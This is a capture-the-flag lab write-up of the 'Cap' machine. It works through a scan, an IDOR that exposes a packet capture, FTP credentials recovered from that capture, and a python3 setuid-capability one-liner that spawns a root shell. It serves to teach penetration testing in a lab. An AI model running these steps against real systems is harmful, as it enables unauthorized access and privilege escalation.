# Cap

<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>







## Ports scan

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Wed, 21 Aug 2024 17:12:49 GMT
<SNIPPED>
```



## Dir scan

```bash
╰─➤  dirscan 10.10.10.245         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.245/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

capture                 [Status: 302, Size: 222, Words: 21, Lines: 4, Duration: 5224ms]
data                    [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 195ms]
ip                      [Status: 200, Size: 17380, Words: 7260, Lines: 354, Duration: 157ms]
netstat                 [Status: 200, Size: 33344, Words: 16071, Lines: 494, Duration: 156ms]
:: Progress: [20476/20476] :: Job [1/1] :: 251 req/sec :: Duration: [0:01:23] :: Errors: 0 ::
                                                                                                     
```



## Web exploitation&#x20;

### IDOR

On homepage if we click on Security Snapshot...\
we are redirected to: [http://10.10.10.245/capture](http://10.10.10.245/capture)

**The redirection sends**: [http://10.10.10.245/data/5](http://10.10.10.245/data/5)\
![](<../../../.gitbook/assets/image (84).png>)



We can change data from `/5` to `/0`

We get a **0.pcap** file (packets)

If we follow the TCP stream of FTP packets, we get FTP username and password

```
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```



## User

Through FTP, we get access to user's home directory

```bash
─➤  ftp 10.10.10.245                                                                                            130 ↵
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||59367|)
150 Here comes the directory listing.
drwxr-xr-x    5 1001     1001         4096 Aug 21 11:57 .
drwxr-xr-x    3 0        0            4096 May 23  2021 ..
lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23  2021 .cache
drwx------    3 1001     1001         4096 Aug 21 11:57 .gnupg
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null
drwxr-xr-x    3 1001     1001         4096 Aug 21 11:56 snap
-r--------    1 1001     1001           33 Aug 21 09:47 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||56389|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |**************************************************************************|    33        0.23 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.05 KiB/s)
ftp> 

```

### SSH into the box to get user shell.

## Root&#x20;

As per the machine name, I search for linux capabilities and found the following article

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" %}

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

```

\_\_\_\_\_\_\_\_\_heapbytes' still pwning
